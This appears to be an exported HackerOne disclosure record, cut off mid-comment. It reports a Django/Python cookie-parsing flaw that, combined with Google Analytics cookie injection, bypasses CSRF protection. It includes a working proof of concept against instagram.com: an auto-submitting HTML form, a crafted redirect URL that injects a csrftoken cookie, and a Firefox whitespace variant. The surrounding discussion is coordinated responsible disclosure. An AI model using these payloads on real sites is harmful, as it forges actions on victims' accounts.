{"id":26647,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjY0Nw==","url":"https://hackerone.com/reports/26647","title":"CSRF protection bypass on any Django powered site via Google Analytics","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-09-01T08:28:27.353Z","submitted_at":"2014-09-01T08:28:27.353Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bobrov","url":"/bobrov","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23,"url":"https://hackerone.com/django","handle":"django","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Django","twitter_handle":null,"website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-09-26T19:29:10.967Z","bug_reporter_agreed_on_going_public_at":"2016-09-26T19:29:10.830Z","team_member_agreed_on_going_public_at":"2016-09-26T19:11:44.454Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I shall explain all the steps to create the final PoC in order to be more clear.\r\n\r\nPart 1. Cookie Injection via Google Analytics \r\n---------------------\r\n(Reported to Google, rewarded, still working)\r\n\r\n*   Google Analytics sets the cookie to track user source:\r\n   `__utmz=123456.123456789.11.2.utmcsr=[HOST]|utmccn=(referral)|utmcmd=referral|utmcct=[PATH]`\r\n   For example:\r\n   `__utmz=123456.123456789.11.2.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/path/`\r\n\r\n*   User fully controls path in Referer and it is not filtered before being put in __utmz\r\n\r\nPart 2. Cookie parsing peculiarities by different web servers\r\n---------------------\r\n*   A typical Cookie sent by a web browser looks like this: \r\n   Cookie: param1=value1; param2=value2;\r\n\r\n*   Many web servers accept cookies delimited not only by semicolons but also by commas: \r\n   Cookie: param1=value2, param2=value2\r\n   Cookie: param1=value2,param2=value2\r\n\r\n*   Python + Django handle cookies with incorrect regular expression that allows to use characters [ \\ ] as delimiters: \r\n   Cookie: param1=value1]param2=value2\r\n\r\nhttps://docs.python.org/3/library/http.cookies.html\r\nhttp://hg.python.org/cpython/file/3.4/Lib/http/cookies.py#l432\r\nhttp://tools.ietf.org/html/rfc2109\r\nhttp://tools.ietf.org/html/rfc2068\r\n\r\nExample:\r\n```\r\n\u003e\u003e\u003e from http import cookies\r\n\u003e\u003e\u003e C = cookies.SimpleCookie()\r\n\u003e\u003e\u003e C.load('__utmz=blah]csrftoken=x')\r\n\u003e\u003e\u003e C\r\n\u003cSimpleCookie: csrftoken='x'\u003e\r\n```\r\n\r\nPart 3. Cookie handling peculiarities in different web browsers \r\n---------------------\r\n(Reported to Google, won't fix)\r\n*   For all the web browsers except Safari characters of space, comma, and [ \\ ] can be used as cookie values\r\n\r\n*   Chrome handles only a limited number of cookie-attributes, e.g.: \r\n   Set-Cookie: test=test; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=blah.blah.blah.google.com;\r\n   will set cookie for .google.com but not for blah.blah.blah.google.com\r\n\r\nCombining all these facts\r\n---------------------\r\n\r\nProvided that:\r\n* A site uses Google Analytics\r\n* This site is hosted by a web server that has some of the aforementioned cookie parsing peculiarities (e.g. Django)\r\n* This site implements Cookie based CSRF protection (a value in Cookie and some request parameter must be equal)\r\n\r\nThen:\r\n* We can set new arbitrary cookies or redefine the values of existing ones\r\n* This site is vulnerable to CSRF protection bypass\r\n\r\n\r\nThe principal problem of __utmz cookie is that it is set for six months and is not refreshed. This problem can be solved in Google Chrome if you find a subdomain with Google Analytics and rewrite attribute \"domain\" using the peculiarity that has been described in part 3 with the value \".site.com\".\r\n\r\nIn other browsers the vulnerability can be exploited by cookie injection at the moment of __utmz refreshing.\r\n\r\nPoC\r\n---------------------\r\n\r\nVulnerability exploitation on instagram.com with Google Chrome\r\n(Reported to Facebook, redirected to Django Team)\r\n\r\n* Open Google Chrome in incognito mode\r\n* Authenticate on instagram.com\r\n* Click the link and wait some seconds\r\n* Result - follow http://instagram.com/black2fan\r\n\r\nhttp://blackfan.ru/facebookbugbounty/nouysqaqfbskgobuqkknoitvyqmjgony_instagram.html\r\nSource:\r\n```\r\n\u003cform \r\naction=\"http://instagram.com/web/friendships/1312928755/follow/?ref=emptyfeed\" \r\nid=\"csrf\" \r\nmethod=\"POST\"\u003e\r\n      \u003cinput type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\"x\" /\u003e\r\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\r\n\u003c/form\u003e\r\n\r\n\u003cscript\u003e\r\n      function xxx() {\r\n        document.getElementById('csrf').submit();\r\n      }\r\n\u003c/script\u003e\r\n\r\n\u003ciframe \r\nonload=\"xxx()\" \r\nsrc=\"http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/\"/\u003e\r\n```\r\n\r\nDescription:\r\n*   A user authenticates on instagram.com\r\n\r\n*   We make him visit the link below assuming that he has not visited blog.instagram.com and he doesn't have __utmz set on this subdomain:\r\n   http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/\r\n   Cookie is rewritten with new path and domain, as a result cookie is set for .instagram.com:\r\n   __utmz=90378079.1401435337.1.1.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/r/,]csrftoken=x,\r\n\r\n*   At this moment request to the web server will make it believe that cookie __utmz consists of incorrect cookie and CSRF token equals to \"x\"\r\n\r\n*   Submit follow form using CSRF-token \"x\"\r\n","vulnerability_information_html":"\u003cp\u003eI shall explain all the steps to create the final PoC in order to be more clear.\u003c/p\u003e\n\n\u003ch2 id=\"part-1-cookie-injection-via-google-analytics\"\u003ePart 1. Cookie Injection via Google Analytics \u003c/h2\u003e\n\n\u003cp\u003e(Reported to Google, rewarded, still working)\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eGoogle Analytics sets the cookie to track user source:\u003cbr\u003e\n\u003ccode\u003e__utmz=123456.123456789.11.2.utmcsr=[HOST]|utmccn=(referral)|utmcmd=referral|utmcct=[PATH]\u003c/code\u003e\u003cbr\u003e\nFor example:\u003cbr\u003e\n\u003ccode\u003e__utmz=123456.123456789.11.2.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/path/\u003c/code\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eUser fully controls path in Referer and it is not filtered before being put in __utmz\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"part-2-cookie-parsing-peculiarities-by-different-web-servers\"\u003ePart 2. Cookie parsing peculiarities by different web servers\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eA typical Cookie sent by a web browser looks like this: \u003cbr\u003e\nCookie: param1=value1; param2=value2;\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eMany web servers accept cookies delimited not only by semicolons but also by commas: \u003cbr\u003e\nCookie: param1=value2, param2=value2\u003cbr\u003e\nCookie: param1=value2,param2=value2\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003ePython + Django handle cookies with incorrect regular expression that allows to use characters [ \\ ] as delimiters: \u003cbr\u003e\nCookie: param1=value1]param2=value2\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca title=\"https://docs.python.org/3/library/http.cookies.html\" href=\"/redirect?url=https%3A%2F%2Fdocs.python.org%2F3%2Flibrary%2Fhttp.cookies.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://docs.python.org/3/library/http.cookies.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"http://hg.python.org/cpython/file/3.4/Lib/http/cookies.py#l432\" href=\"/redirect?url=http%3A%2F%2Fhg.python.org%2Fcpython%2Ffile%2F3.4%2FLib%2Fhttp%2Fcookies.py%23l432\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://hg.python.org/cpython/file/3.4/Lib/http/cookies.py#l432\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"http://tools.ietf.org/html/rfc2109\" href=\"/redirect?url=http%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc2109\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://tools.ietf.org/html/rfc2109\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"http://tools.ietf.org/html/rfc2068\" href=\"/redirect?url=http%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc2068\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://tools.ietf.org/html/rfc2068\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026gt;\u0026gt;\u0026gt; from http import cookies\n\u0026gt;\u0026gt;\u0026gt; C = cookies.SimpleCookie()\n\u0026gt;\u0026gt;\u0026gt; C.load(\u0026#39;__utmz=blah]csrftoken=x\u0026#39;)\n\u0026gt;\u0026gt;\u0026gt; C\n\u0026lt;SimpleCookie: csrftoken=\u0026#39;x\u0026#39;\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"part-3-cookie-handling-peculiarities-in-different-web-browsers\"\u003ePart 3. Cookie handling peculiarities in different web browsers \u003c/h2\u003e\n\n\u003cp\u003e(Reported to Google, won\u0026#39;t fix)\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eFor all the web browsers except Safari characters of space, comma, and [ \\ ] can be used as cookie values\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eChrome handles only a limited number of cookie-attributes, e.g.: \u003cbr\u003e\nSet-Cookie: test=test; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=blah.blah.blah.google.com;\u003cbr\u003e\nwill set cookie for .google.com but not for blah.blah.blah.google.com\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"combining-all-these-facts\"\u003eCombining all these facts\u003c/h2\u003e\n\n\u003cp\u003eProvided that:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eA site uses Google Analytics\u003c/li\u003e\n\u003cli\u003eThis site is hosted by a web server that has some of the aforementioned cookie parsing peculiarities (e.g. Django)\u003c/li\u003e\n\u003cli\u003eThis site implements Cookie based CSRF protection (a value in Cookie and some request parameter must be equal)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThen:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eWe can set new arbitrary cookies or redefine the values of existing ones\u003c/li\u003e\n\u003cli\u003eThis site is vulnerable to CSRF protection bypass\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe principal problem of __utmz cookie is that it is set for six months and is not refreshed. This problem can be solved in Google Chrome if you find a subdomain with Google Analytics and rewrite attribute \u0026quot;domain\u0026quot; using the peculiarity that has been described in part 3 with the value \u0026quot;.site.com\u0026quot;.\u003c/p\u003e\n\n\u003cp\u003eIn other browsers the vulnerability can be exploited by cookie injection at the moment of __utmz refreshing.\u003c/p\u003e\n\n\u003ch2 id=\"poc\"\u003ePoC\u003c/h2\u003e\n\n\u003cp\u003eVulnerability exploitation on instagram.com with Google Chrome\u003cbr\u003e\n(Reported to Facebook, redirected to Django Team)\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eOpen Google Chrome in incognito mode\u003c/li\u003e\n\u003cli\u003eAuthenticate on instagram.com\u003c/li\u003e\n\u003cli\u003eClick the link and wait some seconds\u003c/li\u003e\n\u003cli\u003eResult - follow \u003ca title=\"http://instagram.com/black2fan\" href=\"/redirect?url=http%3A%2F%2Finstagram.com%2Fblack2fan\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://instagram.com/black2fan\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003e\u003ca title=\"http://blackfan.ru/facebookbugbounty/nouysqaqfbskgobuqkknoitvyqmjgony_instagram.html\" href=\"/redirect?url=http%3A%2F%2Fblackfan.ru%2Ffacebookbugbounty%2Fnouysqaqfbskgobuqkknoitvyqmjgony_instagram.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://blackfan.ru/facebookbugbounty/nouysqaqfbskgobuqkknoitvyqmjgony_instagram.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nSource:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;form \naction=\u0026quot;http://instagram.com/web/friendships/1312928755/follow/?ref=emptyfeed\u0026quot; \nid=\u0026quot;csrf\u0026quot; \nmethod=\u0026quot;POST\u0026quot;\u0026gt;\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;csrfmiddlewaretoken\u0026quot; value=\u0026quot;x\u0026quot; /\u0026gt;\n      \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Submit request\u0026quot; /\u0026gt;\n\u0026lt;/form\u0026gt;\n\n\u0026lt;script\u0026gt;\n      function xxx() {\n        document.getElementById(\u0026#39;csrf\u0026#39;).submit();\n      }\n\u0026lt;/script\u0026gt;\n\n\u0026lt;iframe \nonload=\u0026quot;xxx()\u0026quot; \nsrc=\u0026quot;http://blackfan.ru/r/,]csrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/\u0026quot;/\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDescription:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eA user authenticates on instagram.com\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eWe make him visit the link below assuming that he has not visited blog.instagram.com and he doesn\u0026#39;t have __utmz set on this subdomain:\u003cbr\u003e\n\u003ca title=\"http://blackfan.ru/r/,%5Dcsrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/\" href=\"/redirect?url=http%3A%2F%2Fblackfan.ru%2Fr%2F%2C%255Dcsrftoken%3Dx%2C%3Bdomain%3D.instagram.com%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3Bpath%3D%2F%3B%3Fr%3Dhttp%3A%2F%2Fblog.instagram.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://blackfan.ru/r/,%5Dcsrftoken=x,;domain=.instagram.com;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;path=/;?r=http://blog.instagram.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nCookie is rewritten with new path and domain, as a result cookie is set for .instagram.com:\u003cbr\u003e\n__utmz=90378079.1401435337.1.1.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/r/,]csrftoken=x,\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eAt this moment request to the web server will make it believe that cookie __utmz consists of incorrect cookie and CSRF token equals to \u0026quot;x\u0026quot;\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eSubmit follow form using CSRF-token \u0026quot;x\u0026quot;\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n","bounty_amount":"1000.0","formatted_bounty":"$1,000","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-10-26T19:11:44.538Z","allow_singular_disclosure_after":-131709941.49963483,"singular_disclosure_allowed":true,"vote_count":62,"voters":["dirk","fransrosen","d1m0ck","stefanofinding","cdl","hogarth45","bobrov","harisec","hunter","michiel","and 52 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":119774,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Sergey,\n\nthat seems like a really nice finding! I am currently on a conference with flaky WLAN, but I've forwarded it internally. We might need a bit of time for this, cause we need to communicate this to the Python team too and see what they think.","markdown_message":"\u003cp\u003eHi Sergey,\u003c/p\u003e\n\n\u003cp\u003ethat seems like a really nice finding! I am currently on a conference with flaky WLAN, but I\u0026#39;ve forwarded it internally. We might need a bit of time for this, cause we need to communicate this to the Python team too and see what they think.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-09-01T11:30:31.371Z","updated_at":"2014-09-01T11:30:31.371Z","actor":{"username":"apollo13","cleared":false,"url":"/apollo13","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":120260,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Sergey,\n\nFirst off, thank you very much for a well researched, and clearly reported bug. I believe you're the first person to report a valid one through this program. I've looked this over, and I agree that there's a real bug here. As you mentioned, this is a bug in the core Python library, and this example of a practical exploit using Django is very helpful.\n\nI see that you haven't submitted this yet to the security@python.org alias - since it's fundamentally a Python bug, that's where we'll need to start with the fix. I'm on the response team there too, and would appreciate it if you could submit this bug report there (sorry to ask you to forward the report again). Python does have a bounty, and I'll make sure you're properly rewarded for this.\n\nDjango will probably make a security release with a workaround for the Python bug, but we'll need to coordinate with upstream Python to do that, and I expect the reward will come from the Python project.\n\nThank you for your hard work!\n-Paul","markdown_message":"\u003cp\u003eHi Sergey,\u003c/p\u003e\n\n\u003cp\u003eFirst off, thank you very much for a well researched, and clearly reported bug. I believe you\u0026#39;re the first person to report a valid one through this program. I\u0026#39;ve looked this over, and I agree that there\u0026#39;s a real bug here. As you mentioned, this is a bug in the core Python library, and this example of a practical exploit using Django is very helpful.\u003c/p\u003e\n\n\u003cp\u003eI see that you haven\u0026#39;t submitted this yet to the \u003ca title=\"security@python.org\" href=\"mailto:security@python.org\" rel=\"nofollow noopener noreferrer\"\u003esecurity@python.org\u003c/a\u003e alias - since it\u0026#39;s fundamentally a Python bug, that\u0026#39;s where we\u0026#39;ll need to start with the fix. I\u0026#39;m on the response team there too, and would appreciate it if you could submit this bug report there (sorry to ask you to forward the report again). Python does have a bounty, and I\u0026#39;ll make sure you\u0026#39;re properly rewarded for this.\u003c/p\u003e\n\n\u003cp\u003eDjango will probably make a security release with a workaround for the Python bug, but we\u0026#39;ll need to coordinate with upstream Python to do that, and I expect the reward will come from the Python project.\u003c/p\u003e\n\n\u003cp\u003eThank you for your hard work!\u003cbr\u003e\n-Paul\u003c/p\u003e\n","automated_response":false,"created_at":"2014-09-02T20:58:27.243Z","updated_at":"2014-09-02T20:58:27.243Z","actor":{"username":"paulm","cleared":false,"url":"/paulm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/390/60d7b672c1543d67c2225bc3f88d33da478cea89_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":128567,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Sergey,\n\nUpstream python applied this patch:\nhttps://hg.python.org/cpython/rev/270f61ec1157\n\nCan you confirm that this fixes the issue? From my reading of your bug report, I'm not sure it does.\n\nThe Django Project would like to continue to keep this issue private until we can also issue a security release with a workaround.\n\n-Paul","markdown_message":"\u003cp\u003eHi Sergey,\u003c/p\u003e\n\n\u003cp\u003eUpstream python applied this patch:\u003cbr\u003e\n\u003ca title=\"https://hg.python.org/cpython/rev/270f61ec1157\" href=\"/redirect?url=https%3A%2F%2Fhg.python.org%2Fcpython%2Frev%2F270f61ec1157\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://hg.python.org/cpython/rev/270f61ec1157\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eCan you confirm that this fixes the issue? From my reading of your bug report, I\u0026#39;m not sure it does.\u003c/p\u003e\n\n\u003cp\u003eThe Django Project would like to continue to keep this issue private until we can also issue a security release with a workaround.\u003c/p\u003e\n\n\u003cp\u003e-Paul\u003c/p\u003e\n","automated_response":false,"created_at":"2014-09-17T17:12:27.615Z","updated_at":"2014-09-17T17:12:27.615Z","actor":{"username":"paulm","cleared":false,"url":"/paulm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/390/60d7b672c1543d67c2225bc3f88d33da478cea89_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":129067,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, this patch fixes a bug related to the characters  [ \\ ]. \n\nHowever, there are still other similar options, such as the use of white space characters without double quotes. \n\n    C = cookies.SimpleCookie()\n    C.load('__utmz=blah csrftoken=x')\n    C.load('__utmz=blah\\x09csrftoken=x')\n    C.load('__utmz=blah\\x0bcsrftoken=x')\n    C.load('__utmz=blah\\x0ccsrftoken=x') \n\nWith a real exploitation of course there are problems here, because: \n*   Internet Explorer replaces characters \\x09 \\x0b \\x0c on \"_\".\n\n*   Chrome does not set the cookie, if they contain characters \\x09 \\x0b \\x0c. \n\n*   Google Analytics replaces the space with %20 \n(but, nevertheless, the problem may arise in the other JS-scripts or in setting Cookie from Web server).\n\n\nBut Firefox supports all of these characters and that's a real example of another bypass CSRF protection: \n\n1.  Remove all cookie from http://instagram.com \n\n2.  Open the link using FireFox \nhttp://instagram.com/?utm_source=1\u0026utm_medium=2\u0026utm_campaign=3\u0026utm_term=4\u0026utm_content=5%09csrftoken=x#\n\n3.  Reload the page and make sure that csrftoken=x\n","markdown_message":"\u003cp\u003eYes, this patch fixes a bug related to the characters  [ \\ ]. \u003c/p\u003e\n\n\u003cp\u003eHowever, there are still other similar options, such as the use of white space characters without double quotes. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eC = cookies.SimpleCookie()\nC.load(\u0026#39;__utmz=blah csrftoken=x\u0026#39;)\nC.load(\u0026#39;__utmz=blah\\x09csrftoken=x\u0026#39;)\nC.load(\u0026#39;__utmz=blah\\x0bcsrftoken=x\u0026#39;)\nC.load(\u0026#39;__utmz=blah\\x0ccsrftoken=x\u0026#39;) \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWith a real exploitation of course there are problems here, because: \u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003eInternet Explorer replaces characters \\x09 \\x0b \\x0c on \u0026quot;_\u0026quot;.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eChrome does not set the cookie, if they contain characters \\x09 \\x0b \\x0c. \u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eGoogle Analytics replaces the space with %20 \u003cbr\u003e\n(but, nevertheless, the problem may arise in the other JS-scripts or in setting Cookie from Web server).\u003c/p\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eBut Firefox supports all of these characters and that\u0026#39;s a real example of another bypass CSRF protection: \u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eRemove all cookie from \u003ca title=\"http://instagram.com\" href=\"/redirect?url=http%3A%2F%2Finstagram.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://instagram.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eOpen the link using FireFox \u003cbr\u003e\n\u003ca title=\"http://instagram.com/?utm_source=1\u0026amp;utm_medium=2\u0026amp;utm_campaign=3\u0026amp;utm_term=4\u0026amp;utm_content=5%09csrftoken=x\" href=\"/redirect?url=http%3A%2F%2Finstagram.com%2F%3Futm_source%3D1%26utm_medium%3D2%26utm_campaign%3D3%26utm_term%3D4%26utm_content%3D5%2509csrftoken%3Dx\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://instagram.com/?utm_source=1\u0026amp;utm_medium=2\u0026amp;utm_campaign=3\u0026amp;utm_term=4\u0026amp;utm_content=5%09csrftoken=x\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eReload the page and make sure that csrftoken=x\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n","automated_response":false,"created_at":"2014-09-18T10:56:10.824Z","updated_at":"2014-09-18T10:56:10.824Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":148153,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, \nany new info about this vuln?","markdown_message":"\u003cp\u003eHi, \u003cbr\u003e\nany new info about this vuln?\u003c/p\u003e\n","automated_response":false,"created_at":"2014-10-25T06:29:33.412Z","updated_at":"2014-10-25T06:29:33.412Z","actor":{"username":"bobrov","cleared":false,"url":"/bobrov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"django","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":148783,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nwe are working on a patch and will include it during the next security release.  We will show you the diff once we are sufficiently happy with the patch.\n\nCheers,\nFlorian","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003ewe are working on a patch and will include it during the next security release.  We will show you the diff once we are sufficiently happy with the 